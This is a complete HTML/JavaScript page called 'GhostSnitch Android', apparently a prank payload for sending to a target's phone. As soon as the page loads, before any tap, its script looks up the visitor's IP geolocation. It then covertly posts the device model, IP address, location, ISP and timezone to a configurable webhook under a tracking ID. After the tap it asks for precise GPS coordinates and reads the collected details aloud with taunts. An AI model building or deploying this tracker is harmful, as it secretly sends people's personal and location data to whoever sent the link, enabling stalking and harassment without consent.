<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostSnitch Android</title>
    <link rel="icon" type="image/svg+xml" href="https://tbjr.github.io/Flipper-payloads/assets/favicon.svg">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: monospace;
            background: #000;
            color: #0f0;
            padding: 20px;
            margin: 0;
        }
        .container { max-width: 600px; margin: 0 auto; }
        h1 { color: #f00; text-align: center; margin-bottom: 16px; }
        .info {
            margin: 8px 0;
            padding: 10px;
            background: #111;
            border-left: 3px solid #0f0;
            word-break: break-word;
        }
        .status { color: #ff0; }
        .error  { color: #f55; border-left-color: #f55; }

        /* Tap-to-start overlay — required because Chrome on Android blocks
           speechSynthesis.speak() calls that are not inside a user gesture.
           Without this tap the entire TTS roast is silently dropped. */
        #gate {
            position: fixed;
            inset: 0;
            background: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 999;
            cursor: pointer;
        }
        #gate h2 { color: #f00; font-size: 1.6rem; margin-bottom: 24px; }
        #gate button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 18px 40px;
            font-size: 1.2rem;
            font-family: monospace;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }
        #gate button:active { opacity: 0.7; }
    </style>
</head>
<body>
    <!-- Gate overlay — tapping here satisfies Chrome's user-gesture requirement
         so speechSynthesis.speak() actually fires instead of being silently blocked -->
    <div id="gate" onclick="startRoast()">
        <h2>👻 GhostSnitch</h2>
        <button>Tap to Continue</button>
    </div>

    <div class="container">
        <h1>🤖 GhostSnitch Android</h1>
        <div id="output"></div>
    </div>

    <script>
        // ── Tracker config (edit before deploying) ────────────────────────────────
        const WEBHOOK_URL = 'REPLACE_ME';
        const PRANK_ID    = (() => {
            try { return crypto.randomUUID().replace(/-/g, '').slice(0, 8).toUpperCase(); }
            catch { return Math.random().toString(36).slice(2, 10).toUpperCase(); }
        })();
        // ─────────────────────────────────────────────────────────────────────────

        const output = document.getElementById('output');
        let roastStarted = false;
        let geoData = {};

        function addInfo(text, cls = '') {
            const div = document.createElement('div');
            div.className = 'info ' + cls;
            div.textContent = text;
            output.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth' });
        }

        // Chrome on Android silently drops speechSynthesis.speak() unless it
        // was triggered (directly or indirectly) by a user gesture. The gate
        // overlay ensures this function always runs inside that gesture chain.
        function speak(text) {
            addInfo('🔊 ' + text, 'status');
            if ('speechSynthesis' in window) {
                const u = new SpeechSynthesisUtterance(text);
                u.rate  = 0.95;
                u.pitch = 1.0;
                u.volume = 1.0;
                // Prefer the first non-remote English voice if available
                const voices = window.speechSynthesis.getVoices();
                const eng = voices.find(v => v.lang.startsWith('en') && !v.remote);
                if (eng) u.voice = eng;
                window.speechSynthesis.speak(u);
            }
        }

        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

        // --------------- Tracker helpers ---------------

        async function fetchGeoData() {
            try {
                const res = await fetch('https://ipwho.is/');
                geoData = await res.json();
            } catch { geoData = {}; }
        }

        async function sendDeliveryPing() {
            if (WEBHOOK_URL === 'REPLACE_ME') return;
            const ua = navigator.userAgent;
            const uaMatch = ua.match(/\(Linux;\s*Android\s*([\d.]+);\s*([^)]+?)\s*(?:Build\/[^)]+)?\)/);
            const device = uaMatch ? uaMatch[2].trim() : (navigator.platform || 'Unknown');
            const loc = [geoData.city, geoData.region, geoData.country].filter(Boolean).join(', ') || 'Unknown';
            const payload = {
                username: 'GhostSnitch Tracker',
                content:  `📡 **Delivery confirmed** | ID: \`${PRANK_ID}\``,
                embeds: [{
                    title:  'Android — Page Loaded',
                    color:  0xFF8C00,
                    fields: [
                        { name: 'Prank ID',  value: PRANK_ID,                        inline: true  },
                        { name: 'Device',    value: device,                          inline: true  },
                        { name: 'IP',        value: geoData.ip        || 'Unknown',  inline: true  },
                        { name: 'Location',  value: loc,                             inline: false },
                        { name: 'ISP',       value: geoData.connection?.isp || 'Unknown', inline: true },
                        { name: 'Timezone',  value: geoData.timezone?.id   || 'Unknown', inline: true },
                    ],
                    footer:    { text: 'GhostSnitch Android v3.2 — delivery ping (before gate tap)' },
                    timestamp: new Date().toISOString()
                }]
            };
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch {}
        }

        // Fire geo fetch + delivery ping immediately on page load (before gate tap)
        window.addEventListener('load', async () => {
            await fetchGeoData();
            sendDeliveryPing();
        });

        // --------------- Data gathering ---------------

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            // Extract Android version and device model from UA string
            // Format: (Linux; Android <ver>; <model>) or (Linux; Android <ver>; <model> Build/...)
            const uaMatch = ua.match(/\(Linux;\s*Android\s*([\d.]+);\s*([^)]+?)\s*(?:Build\/[^)]+)?\)/);
            const androidVer  = uaMatch ? uaMatch[1] : 'Unknown';
            const deviceModel = uaMatch ? uaMatch[2].trim() : (navigator.platform || 'Unknown');
            addInfo(`📱 Device: ${deviceModel}  |  Android ${androidVer}`);
            speak(`You're running Android ${androidVer} on a ${deviceModel}. Brave, but foolish.`);
        }

        function getRAMInfo() {
            if ('deviceMemory' in navigator) {
                const ram = navigator.deviceMemory;
                // The API deliberately returns coarse bucket values (0.25–8 GB) for privacy
                addInfo(`💾 RAM: ~${ram} GB (coarse estimate)`);
                speak(`This device has around ${ram} gigabytes of RAM. That's cute.`);
            } else {
                addInfo('💾 RAM: Not available (API unsupported)');
                speak("Couldn't read your RAM. Probably not enough to matter anyway.");
            }
        }

        function getIPInfo() {
            // Uses geoData pre-fetched on page load via ipwho.is
            const ip = geoData.ip;
            if (ip) {
                addInfo(`🌐 Public IP: ${ip}`);
                speak(`Your public IP is ${ip}. And I know where you live now.`);
            } else {
                addInfo('🌐 Public IP: Unknown', 'error');
                speak("Couldn't fetch your IP. Hiding behind a VPN? Smart move.");
            }
        }

        function getGeoInfo() {
            if (geoData.ip) {
                const loc = [geoData.city, geoData.region, geoData.country].filter(Boolean).join(', ');
                const isp = geoData.connection?.isp || 'Unknown ISP';
                addInfo(`📍 Location: ${loc}  |  ISP: ${isp}`);
                speak(`You appear to be in ${geoData.city || geoData.country || 'an unknown location'}. Cozy spot.`);
            } else {
                addInfo('📍 Location: Unavailable', 'error');
            }
        }

        function getNetworkInfo() {
            // Network Information API — Chrome Android only, not in Safari or Firefox
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                const type    = conn.effectiveType || conn.type || 'Unknown';
                const downlink = conn.downlink != null ? `${conn.downlink} Mbps` : 'Unknown';
                addInfo(`📶 Network: ${type}  |  Downlink: ${downlink}`);
                speak(`Your connection is ${type} at ${downlink}. Weak sauce.`);
            } else {
                addInfo('📶 Network: Not available (API unsupported on this browser)');
                speak("Couldn't access network info. Your browser is keeping secrets.");
            }
        }

        function getLocationHint() {
            if (!('geolocation' in navigator)) {
                addInfo('📍 Location: Not available');
                speak("Location services not available here.");
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const lat = pos.coords.latitude.toFixed(2);
                    const lon = pos.coords.longitude.toFixed(2);
                    addInfo(`📍 Location: ${lat}, ${lon}`);
                    speak(`Your approximate location is ${lat}, ${lon}. Cozy.`);
                },
                () => {
                    addInfo('📍 Location: Blocked by user');
                    speak("Location blocked. Privacy settings are actually working for once.");
                },
                { timeout: 8000 }
            );
        }

        // --------------- Orchestration ---------------

        async function main() {
            addInfo(`🎯 Prank ID: ${PRANK_ID}`, 'status');
            speak("Hello Android user. Let's begin.");
            await wait(2000);

            getDeviceInfo();
            await wait(2500);

            getRAMInfo();
            await wait(2000);

            getIPInfo();
            await wait(2000);

            getGeoInfo();
            await wait(2000);

            getNetworkInfo();
            await wait(2000);

            getLocationHint();
            await wait(3000);

            speak("GhostSnitch Android signing off. Sleep tight.");
            addInfo('✅ Execution complete', 'status');
        }

        // Gate click handler — runs main() inside a user-gesture callback so
        // the Speech API autoplay policy is satisfied for all subsequent calls
        function startRoast() {
            if (roastStarted) return;
            roastStarted = true;
            document.getElementById('gate').style.display = 'none';
            main();
        }
    </script>
</body>
</html>
